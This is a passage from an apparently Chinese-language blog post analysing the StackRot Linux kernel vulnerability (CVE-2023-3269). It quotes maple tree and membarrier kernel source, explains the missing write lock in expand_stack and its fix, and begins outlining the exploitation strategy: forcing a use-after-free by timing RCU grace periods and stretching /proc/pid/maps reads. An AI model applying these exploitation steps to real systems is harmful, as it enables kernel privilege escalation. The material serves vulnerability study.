<p>体现在代码上的话，就是mas_wr_modify中S1走上面的分支，S2走下面的分支</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((wr_mas-&gt;offset_end - mas-&gt;offset &lt;= <span class="hljs-number">1</span>) &amp;&amp; mas_wr_slot_store(wr_mas))<br>    <span class="hljs-keyword">return</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mas_wr_node_store(wr_mas))<br>    <span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure>

<ul>
<li><p>mas_wr_slot_store只更改了pivot和slot数组的对应项</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">mas_wr_slot_store</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ma_wr_state *wr_mas)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ma_state</span> *<span class="hljs-title">mas</span> =</span> wr_mas-&gt;mas;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> lmax; <span class="hljs-comment">/* Logical max. */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> offset = mas-&gt;offset;<br><br>	<span class="hljs-comment">/* ... */</span><br><br>	<span class="hljs-comment">/* Overwriting a portion of offset and all of offset + 1 */</span><br>	<span class="hljs-keyword">if</span> ((offset + <span class="hljs-number">1</span> &lt; mt_pivots[wr_mas-&gt;type]) &amp;&amp;<br>	    (wr_mas-&gt;entry || wr_mas-&gt;pivots[offset + <span class="hljs-number">1</span>]))<br>		wr_mas-&gt;pivots[offset + <span class="hljs-number">1</span>] = mas-&gt;last;<br><br>	rcu_assign_pointer(wr_mas-&gt;slots[offset + <span class="hljs-number">1</span>], wr_mas-&gt;entry);<br>	wr_mas-&gt;pivots[offset] = mas-&gt;index - <span class="hljs-number">1</span>;<br>	mas-&gt;offset++; <span class="hljs-comment">/* Keep mas accurate. */</span><br><br>done:<br>	trace_ma_write(__func__, mas, <span class="hljs-number">0</span>, wr_mas-&gt;entry);<br>	mas_update_gap(mas);<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p>而mas_wr_node_store由于slot的数量变了，后面的slot和pivot都需要往前移动，所以需要新申请一个maple node，把内容复制过去，并把父结点slot数组的对应指针换掉</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">mas_wr_node_store</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ma_wr_state *wr_mas)</span><br>&#123;<br>	<span class="hljs-comment">/* ... */</span><br><br>	newnode-&gt;parent = mas_mn(mas)-&gt;parent;<br>	dst_pivots = ma_pivots(newnode, wr_mas-&gt;type);<br>	dst_slots = ma_slots(newnode, wr_mas-&gt;type);<br>	<span class="hljs-comment">/* Copy from start to insert point */</span><br>	<span class="hljs-built_in">memcpy</span>(dst_pivots, wr_mas-&gt;pivots, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) * (offset + <span class="hljs-number">1</span>));<br>	<span class="hljs-built_in">memcpy</span>(dst_slots, wr_mas-&gt;slots, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span> *) * (offset + <span class="hljs-number">1</span>));<br>	dst_offset = offset;<br><br>	<span class="hljs-comment">/* Handle insert of new range starting after old range */</span><br>	<span class="hljs-keyword">if</span> (wr_mas-&gt;r_min &lt; mas-&gt;index) &#123;<br>		mas-&gt;offset++;<br>		rcu_assign_pointer(dst_slots[dst_offset], wr_mas-&gt;content);<br>		dst_pivots[dst_offset++] = mas-&gt;index - <span class="hljs-number">1</span>;<br>	&#125;<br><br>	<span class="hljs-comment">/* Store the new entry and range end. */</span><br>	<span class="hljs-keyword">if</span> (dst_offset &lt; max_piv)<br>		dst_pivots[dst_offset] = mas-&gt;last;<br>	mas-&gt;offset = dst_offset;<br>	rcu_assign_pointer(dst_slots[dst_offset], wr_mas-&gt;entry);<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * this range wrote to the end of the node or it overwrote the rest of</span><br><span class="hljs-comment">	 * the data</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (wr_mas-&gt;offset_end &gt; wr_mas-&gt;node_end || mas-&gt;last &gt;= mas-&gt;max) &#123;<br>		new_end = dst_offset;<br>		<span class="hljs-keyword">goto</span> done;<br>	&#125;<br><br>	dst_offset++;<br>	<span class="hljs-comment">/* Copy to the end of node if necessary. */</span><br>	copy_size = wr_mas-&gt;node_end - wr_mas-&gt;offset_end + <span class="hljs-number">1</span>;<br>	<span class="hljs-built_in">memcpy</span>(dst_slots + dst_offset, wr_mas-&gt;slots + wr_mas-&gt;offset_end,<br>	       <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span> *) * copy_size);<br>	<span class="hljs-keyword">if</span> (dst_offset &lt; max_piv) &#123;<br>		<span class="hljs-keyword">if</span> (copy_size &gt; max_piv - dst_offset)<br>			copy_size = max_piv - dst_offset;<br><br>		<span class="hljs-built_in">memcpy</span>(dst_pivots + dst_offset,<br>		       wr_mas-&gt;pivots + wr_mas-&gt;offset_end,<br>		       <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) * copy_size);<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> ((wr_mas-&gt;node_end == node_slots - <span class="hljs-number">1</span>) &amp;&amp; (new_end &lt; node_slots - <span class="hljs-number">1</span>))<br>		dst_pivots[new_end] = mas-&gt;max;<br><br>done:<br>	mas_leaf_set_meta(mas, newnode, dst_pivots, maple_leaf_64, new_end);<br>	<span class="hljs-keyword">if</span> (in_rcu) &#123;<br>		mte_set_node_dead(mas-&gt;node);<br>		mas-&gt;node = mt_mk_node(newnode, wr_mas-&gt;type);<br>        <br>        <span class="hljs-comment">/* 在mas_replace里替换父节点slot数组的指针 */</span><br>		mas_replace(mas, <span class="hljs-literal">false</span>);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-built_in">memcpy</span>(wr_mas-&gt;node, newnode, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> maple_node));<br>	&#125;<br>	trace_ma_write(__func__, mas, <span class="hljs-number">0</span>, wr_mas-&gt;entry);<br>	mas_update_gap(mas);<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><em><strong>问题出现了:)什么问题暂且按下不表</strong></em></p>
</li>
</ul>
<h2 id="maple-tree锁机制"><a href="#maple-tree锁机制" class="headerlink" title="maple tree锁机制"></a>maple tree锁机制</h2><p><em>怎么开始写论文了…</em></p>
<p>在引入maple tree之前，使用rb tree组织vm_area_struct的时候，基本只使用mm_struct的mmap_lock保证并发访问的互斥</p>
<ul>
<li>写操作需要持写锁，调mmap_write_lock</li>
<li>读操作需要持读锁，调mmap_read_lock</li>
</ul>
<p>由于虚拟进程空间（mm_struct）是进程独有的，所以要访问vm_area_struct的rb tree只能通过mm_struct，持有mm_struct的mmap_lock就能保证互斥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">mmap</span>;</span>		<span class="hljs-comment">/* list of VMAs */</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rb_root</span> <span class="hljs-title">mm_rb</span>;</span><br>		<span class="hljs-comment">/* ... */</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rw_semaphore</span> <span class="hljs-title">mmap_lock</span>;</span><br>        <span class="hljs-comment">/* ... */</span><br>    &#125;<br>	<span class="hljs-comment">/* ... */</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>但由于这种粗粒度的管理，所有vma访问都要争用mmap_lock，导致这把锁的争用非常严重</p>
<p>所以引入了maple tree，减少乃至消除mmap_lock的争用</p>
<blockquote>
<p>The first user that is covered in this patch set is the vm_area_struct,<br>where three data structures are replaced by the maple tree: the augmented<br>rbtree, the vma cache, and the linked list of VMAs in the mm_struct.  The<br>long term goal is to reduce or remove the mmap_lock contention.<sup>[1]</sup></p>
</blockquote>
<p>maple tree是RCU安全的，具体来说是slot和pad数组的指针使用RCU保护</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">maple_range_64</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">maple_pnode</span> *<span class="hljs-title">parent</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pivot[MAPLE_RANGE64_SLOTS - <span class="hljs-number">1</span>];<br>	<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>		<span class="hljs-type">void</span> __rcu *slot[MAPLE_RANGE64_SLOTS];<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>			<span class="hljs-type">void</span> __rcu *pad[MAPLE_RANGE64_SLOTS - <span class="hljs-number">1</span>];<br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">maple_metadata</span> <span class="hljs-title">meta</span>;</span><br>		&#125;;<br>	&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>RCU保证读写的并发，写者需要持有maple tree的ma_lock保证写者之间的并发</p>
<blockquote>
<p>The tree can also be put into an RCU-safe mode of operation which allows reading and writing concurrently. Writers must synchronize on a lock, which can be the default spinlock, or the user can set the lock to an external lock of a different type.<sup>[2]</sup></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">maple_tree</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>		<span class="hljs-type">spinlock_t</span>	ma_lock;<br>		lockdep_map_p	ma_external_lock;<br>	&#125;;<br>	<span class="hljs-type">void</span> __rcu      *ma_root;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>	ma_flags;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>maple tree提供Normal API和Advanced API，在使用Normal API时不用担心锁的问题，因为API会自己处理持锁问题</p>
<blockquote>
<p>You do not have to worry about locking. See Advanced Locking for other options.<sup>[3]</sup></p>
<p>The Maple Tree uses RCU and an internal spinlock to synchronise access:</p>
<p>Takes RCU read lock:</p>
<ul>
<li>mtree_load()</li>
<li>mt_find()</li>
<li>mt_for_each()</li>
<li>mt_next()</li>
<li>mt_prev()</li>
</ul>
<p>Takes ma_lock internally:</p>
<ul>
<li>mtree_store()</li>
<li>mtree_store_range()</li>
<li>mtree_insert()</li>
<li>mtree_insert_range()</li>
<li>mtree_erase()</li>
<li>mtree_dup()</li>
<li>mtree_destroy()</li>
<li>mt_set_in_rcu()</li>
<li>mt_clear_in_rcu()</li>
</ul>
</blockquote>
<p>举例mt_find：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mt_find</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> maple_tree *mt, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *index, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> max)</span><br>&#123;<br>	MA_STATE(mas, mt, *index, *index);<br>	<span class="hljs-type">void</span> *entry;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_MAPLE_TREE</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> copy = *index;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>	trace_ma_read(__func__, &amp;mas);<br><br>	<span class="hljs-keyword">if</span> ((*index) &gt; max)<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>	rcu_read_lock(); <span class="hljs-comment">// RCU critical section begin</span><br>retry:<br>	entry = mas_state_walk(&amp;mas);<br>	<span class="hljs-keyword">if</span> (mas_is_start(&amp;mas))<br>		<span class="hljs-keyword">goto</span> retry;<br><br>	<span class="hljs-keyword">if</span> (unlikely(xa_is_zero(entry)))<br>		entry = <span class="hljs-literal">NULL</span>;<br><br>	<span class="hljs-keyword">if</span> (entry)<br>		<span class="hljs-keyword">goto</span> unlock;<br><br>	<span class="hljs-keyword">while</span> (mas_searchable(&amp;mas) &amp;&amp; (mas.index &lt; max)) &#123;<br>		entry = mas_next_entry(&amp;mas, max);<br>		<span class="hljs-keyword">if</span> (likely(entry &amp;&amp; !xa_is_zero(entry)))<br>			<span class="hljs-keyword">break</span>;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (unlikely(xa_is_zero(entry)))<br>		entry = <span class="hljs-literal">NULL</span>;<br>unlock:<br>	rcu_read_unlock(); <span class="hljs-comment">// RCU critical section end</span><br>	<span class="hljs-keyword">if</span> (likely(entry)) &#123;<br>		*index = mas.last + <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_MAPLE_TREE</span><br>		<span class="hljs-keyword">if</span> ((*index) &amp;&amp; (*index) &lt;= copy)<br>			pr_err(<span class="hljs-string">&quot;index not increased! %lx &lt;= %lx\n&quot;</span>,<br>			       *index, copy);<br>		MT_BUG_ON(mt, (*index) &amp;&amp; ((*index) &lt;= copy));<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	&#125;<br><br>	<span class="hljs-keyword">return</span> entry;<br>&#125;<br>EXPORT_SYMBOL(mt_find);<br></code></pre></td></tr></table></figure>

<p>Advanced API提供更好的性能，但与之相同的，用户需要自行处理持锁的问题。Advanced API使用之前提到的ma_state进行状态跟踪，这也是mas前缀的来源</p>
<blockquote>
<p>The advanced API offers more flexibility and better performance at the cost of an interface which can be harder to use and has fewer safeguards. You must take care of your own locking while using the advanced API. You can use the ma_lock, RCU or an external lock for protection. You can mix advanced and normal operations on the same array, as long as the locking is compatible.<sup>[4]</sup></p>
</blockquote>
<p>引入maple tree需要将很多原本使用rb tree的vma查找的API中的rb tree操作替换成maple tree操作</p>
<ul>
<li><p>比如find_vma，这里的替换使用的是Normal API mt_find，会自行处理RCU锁<sup>[5]</sup></p>
</li>
<li><p>比如find_vma_prev，替换使用的是Advanced API，需要用户自行加锁，所以patch v4开发者评论建议在documentation comments中提出这一点<sup>[6]</sup></p>
<blockquote>
<p>Additional note: the previous patch for find_vma() mentioned “Using the<br>maple tree interface mt_find() will handle the RCU locking” while<br>find_vma_prev() uses the advanced maple tree API, thus IIUC without RCU<br>locking, and doesn’t add its own. This can easily result in a bug,<br>especially if the documentation comments don’t mention it at all?</p>
</blockquote>
<p>v5补充了comments，在使用find_vma_prev之前已经持有了mmap_lock所以不需要RCU lock了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * find_vma_prev() - Find the VMA for a given address, or the next vma and</span><br><span class="hljs-comment"> * set %pprev to the previous VMA, if any.</span><br><span class="hljs-comment"> * @mm: The mm_struct to check</span><br><span class="hljs-comment"> * @addr: The address</span><br><span class="hljs-comment"> * @pprev: The pointer to set to the previous VMA</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Note that RCU lock is missing here since the external mmap_lock() is used</span><br><span class="hljs-comment"> * instead.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns: The VMA associated with @addr, or the next vma.</span><br><span class="hljs-comment"> * May return %NULL in the case of no vma at addr or above.</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure></li>
</ul>
<p><em>至于为什么明明希望减少mmap_lock的争用，依然不持RCU使用Advanced API，我没查出来￣へ￣</em></p>
<p>为了减少mmap_lock的争用，后续的Per-VMA locks系列patch<sup>[7]</sup>提供了更加细粒度的vma锁保护</p>
<p>综上：</p>
<ul>
<li>maple tree RCU+ma_lock保证vma的查找并发</li>
<li>Per-VMA locks保证单个vma的读写并发</li>
</ul>
<p>两者提供了原本由mmap_lock提供的vma数据结构并发安全，但更细粒度。Per-VMA locks系列patch在page fault处理中通过这种方法绕过了mmap_lock，后续patch在&#x2F;proc&#x2F;pid&#x2F;maps绕过了mmap_lock</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据maple tree锁机制所述，Per-VMA locks+maple tree RCU &amp; ma_lock能提供mmap_lock提供的vm_area_struct并发安全，但在引入Per-VMA locks之前还需要mmap_lock，因为maple tree只提供vm_area_struct遍历过程的锁保护，不提供vm_are_struct数据的锁保护</p>
<p>所以及时已经引入了maple tree，依然需要使用mmap_lock</p>
<p>在栈扩展中提到某种情形下需要进行slot合并：释放旧结点、申请新结点、改父节点slot指针，也就是对maple tree进行写操作，<strong>但expand_stack没有持mmap_write_lock，而是持mmap_read_lock</strong></p>
<img src="/2026/02/28/cve-2023-3269/modify-stack2.png" srcset="/img/loading.gif" lazyload class title="modify-stack2">

<p>虽然理论上来说maple tree RCU能提供遍历过程读写的锁保护，但由find_vma_prev的comments可知，现在并没有完全依赖RCU，<strong>部分路径依然依赖mmap_lock，没有做到RCU安全</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * find_vma_prev() - Find the VMA for a given address, or the next vma and</span><br><span class="hljs-comment"> * set %pprev to the previous VMA, if any.</span><br><span class="hljs-comment"> * @mm: The mm_struct to check</span><br><span class="hljs-comment"> * @addr: The address</span><br><span class="hljs-comment"> * @pprev: The pointer to set to the previous VMA</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Note that RCU lock is missing here since the external mmap_lock() is used</span><br><span class="hljs-comment"> * instead.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns: The VMA associated with @addr, or the next vma.</span><br><span class="hljs-comment"> * May return %NULL in the case of no vma at addr or above.</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure>

<p>综上对于某些maple tree读路径：</p>
<ul>
<li>RCU层面没持rcu_read_lock</li>
<li>在expand_stack合并slot情形下写侧没有mmap_write_lock保护</li>
</ul>
<p>出问题了呢~</p>
<p>这个漏洞可以认为是读侧缺少rcu_read_lock导致的race，也可以是认为是写侧没有持mmap_write_lock导致的race，在修复的时候选择的修复策略是expand_stack加mmap_write_lock<sup>[8]</sup>，因为上面也说过，理论上现在无法提供vm_area_struct数据的锁保护，并且现行的代码策略不倾向于全部路径提供RCU锁保护，所以修复选择加mmap_write_lock</p>
<p>在引入maple tree之前vm_are_struct的遍历完全依赖mmap_lock，但expand_stack这种明显的写路径没加mmap_write_lock其实明显是一个bug，但一直没有出现问题，因为在这种情形下rb tree和maple tree不一样，不需要进行slot的合并，只需要更改vm_start<sup>[8]</sup></p>
<blockquote>
<p>That is, it was all fine until Ruihan Li pointed out that now that the vma layout uses the maple tree code, we <em>really</em> don’t just change vm_start and vm_end any more, and the locking really is broken.  Oops.</p>
</blockquote>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><em>StackRot原文<sup>[9]</sup>写的很好了，这里就进行一个翻译，加上实操的一些注意事项</em></p>
<p>写侧就是expand_stack，读侧我们需要找一条遍历路径能够：</p>
<ul>
<li>遍历时间足够长，能够拖到RCU宽限期结束</li>
<li>遍历会从vm_area_struct取某些信息返回用户态，用于leak kernel address</li>
<li>遍历使用vm_are_struct的一些函数指针，用于劫持PC</li>
</ul>
<p>选择&#x2F;proc&#x2F;pid&#x2F;maps读取路径</p>
<h2 id="From-UAFBR-to-UAF"><a href="#From-UAFBR-to-UAF" class="headerlink" title="From UAFBR to UAF"></a>From UAFBR to UAF</h2><p>以下是写侧的调用栈，在mas_wr_node_store替换slot指针之前获取到old node指针，在call_rcu free old node之后访问old node就有UAF了，这样就需要解决两个问题：</p>
<ol>
<li>怎么知道old node什么时候free</li>
<li>怎么确保读侧在RCU宽限期结束，old node被free之后访问old node</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">expand_downwards<br>    -&gt; vma_mas_store<br>    -&gt; mas_store_prealloc<br>    -&gt; mas_wr_store_entry<br>    -&gt; mas_wr_modify<br>    -&gt; mas_wr_node_store<br>    <span class="hljs-comment">/* replace slot pointer */</span><br>    -&gt; mas_replace<br>    -&gt; mas_free<br>    -&gt; ma_free_rcu<br>    -&gt; call_rcu(mt_free_rcu)<br>    -&gt; mt_free_rcu<br>    <span class="hljs-comment">/* free old node */</span><br></code></pre></td></tr></table></figure>

<ol>
<li><p>synchronize_rcu函数会等到RCU宽限期结束，确保先前的RCU callbacks被唤醒，linux提供系统调用<code>membarrier(MEMBARRIER_CMD_GLOBAL, 0, -1)</code>最后call synchronize_rcu，这样这个系统调用返回的时候，可以确保old node被free</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(membarrier, <span class="hljs-type">int</span>, cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, flags, <span class="hljs-type">int</span>, cpu_id)<br>&#123;<br>	<span class="hljs-comment">/* ... */</span><br>	<span class="hljs-keyword">switch</span> (cmd) &#123;<br>	<span class="hljs-comment">/* ... */</span><br>	<span class="hljs-keyword">case</span> MEMBARRIER_CMD_GLOBAL:<br>		<span class="hljs-comment">/* MEMBARRIER_CMD_GLOBAL is not compatible with nohz_full. */</span><br>		<span class="hljs-keyword">if</span> (tick_nohz_full_enabled())<br>			<span class="hljs-keyword">return</span> -EINVAL;<br>		<span class="hljs-keyword">if</span> (num_online_cpus() &gt; <span class="hljs-number">1</span>)<br>			synchronize_rcu();<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">/* ... */</span><br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p>要解决问题2可以有以下几种方式：</p>
<ol>
<li><p>遍历任务被抢占，RCU宽限期结束，然后遍历任务再恢复执行，但这需要开启CONFIG_PREEMPT</p>
</li>
<li><p>遍历任务睡眠（比如等待IO），RCU宽限期结束，遍历继续，目前没发现这样的可用路径</p>
</li>
<li><p>遍历任务被中断（比如时钟中断），RCU宽限期结束，但结束RCU宽限期需要进程能处理IPI中断，如果遍历任务已经在中断处理中会处在关中断状态</p>
</li>
<li><p>拖长遍历任务，让RCU宽限期到期，这是最后选择的方案</p>
<p>如果RCU宽限期超过jiffies_till_first_fqs，IPI中断会被发往所有CPU验证是否在RCU临界区，由于遍历没有持rcu_read_lock，被判定不在RCU临界区，触发voluntary preemption，RCU宽限期结束，UAF有了</p>
</li>
</ol>
</li>
</ol>
<p>至于怎么拖长遍历任务，可以mmap一个文件为一个vm_are_struct，在读取&#x2F;proc&#x2F;pid&#x2F;maps时会调用seq_file_path获取文件路径</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span></span><br><span class="hljs-function"><span class="hljs-title">show_map_vma</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-comment">/* ... */</span><br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Print the dentry name for named mappings, and a</span><br><span class="hljs-comment">	 * special [heap] marker for the heap:</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (file) &#123;<br>		<span 